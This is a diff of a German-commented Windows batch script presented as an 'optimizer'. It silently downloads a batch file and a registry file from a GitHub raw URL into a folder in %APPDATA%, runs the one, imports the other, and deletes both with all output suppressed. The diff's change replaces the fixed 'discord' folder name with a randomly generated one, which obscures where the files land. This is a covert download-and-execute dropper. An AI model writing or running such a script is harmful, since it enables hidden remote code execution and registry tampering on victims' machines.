@@ -11,19 +11,32 @@ if %errorLevel% neq 0 (
 )
 
 :: =============================
-:: 2. %APPDATA% Ordner für "discord"
+:: 2. Zufälligen Ordnernamen generieren (7-13 Zeichen)
 :: =============================
-set "appDataPath=%APPDATA%\discord"
+set "length=7"
+set "charset=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "randomName="
+
+:generateRandom
+set /a "randIndex=%random% %% 62"
+for /f "delims=" %%a in ('echo %charset:~%randIndex%,1%') do set "randomName=!randomName!%%a"
+set /a "length-=1"
+if !length! gtr 0 goto generateRandom
 
 :: =============================
-:: 3. Ordner erstellen, falls er nicht existiert
+:: 3. %APPDATA% Ordner für zufälligen Namen
+:: =============================
+set "appDataPath=%APPDATA%\%randomName%"
+
+:: =============================
+:: 4. Ordner erstellen, falls er nicht existiert
 :: =============================
 if not exist "%appDataPath%" (
     mkdir "%appDataPath%"
 )
 
 :: =============================
-:: 4. Dateipfade und URLs
+:: 5. Dateipfade und URLs
 :: =============================
 set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/refs/heads/main/opti.bat"
 set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/refs/heads/main/optimizter.reg"
@@ -32,7 +45,7 @@ set "batFile=%appDataPath%\opti.bat"
 set "regFile=%appDataPath%\optimizter.reg"
 
 :: =============================
-:: 5. Dateien herunterladen
+:: 6. Dateien herunterladen
 powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
 if not exist "%batFile%" exit /b
 
@@ -40,16 +53,16 @@ powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nu
 if not exist "%regFile%" exit /b
 
 :: =============================
-:: 6. Ausführen & Registry importieren
+:: 7. Ausführen & Registry importieren
 call "%batFile%" >nul 2>&1
 reg import "%regFile%" >nul 2>&1
 
 :: =============================
-:: 7. Dateien löschen
+:: 8. Dateien löschen
 del /f /q "%batFile%" >nul 2>&1
 del /f /q "%regFile%" >nul 2>&1
 
 :: =============================
-:: 8. Kleines Delay vor dem Schließen
+:: 9. Kleines Delay vor dem Schließen
 timeout /t 2 >nul
 exit
